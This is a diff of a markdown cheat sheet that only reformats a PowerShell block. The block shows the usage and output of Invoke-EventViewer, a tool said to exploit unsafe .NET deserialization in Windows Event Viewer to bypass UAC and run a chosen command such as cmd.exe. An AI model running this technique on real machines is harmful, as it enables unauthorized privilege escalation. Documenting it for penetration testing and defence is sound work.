@@ -14,18 +14,18 @@ Source: https://github.com/CsEnox/EventViewer-UACBypass<br>
 RCE through Unsafe .Net Deserialization in Windows Event Viewer which leads to UAC bypass.<br>
 
 ```powershell
-    PS C:\Windows\Tasks> Import-Module .\Invoke-EventViewer.ps1
-    
-    PS C:\Windows\Tasks> Invoke-EventViewer 
-    [-] Usage: Invoke-EventViewer commandhere
-    Example: Invoke-EventViewer cmd.exe
-    
-    PS C:\Windows\Tasks> Invoke-EventViewer cmd.exe
-    [+] Running
-    [1] Crafting Payload
-    [2] Writing Payload
-    [+] EventViewer Folder exists
-    [3] Finally, invoking eventvwr
+PS C:\Windows\Tasks> Import-Module .\Invoke-EventViewer.ps1
+
+PS C:\Windows\Tasks> Invoke-EventViewer 
+[-] Usage: Invoke-EventViewer commandhere
+Example: Invoke-EventViewer cmd.exe
+
+PS C:\Windows\Tasks> Invoke-EventViewer cmd.exe
+[+] Running
+[1] Crafting Payload
+[2] Writing Payload
+[+] EventViewer Folder exists
+[3] Finally, invoking eventvwr
 ```
 
 ## Manual Approach - ComputerDefaults
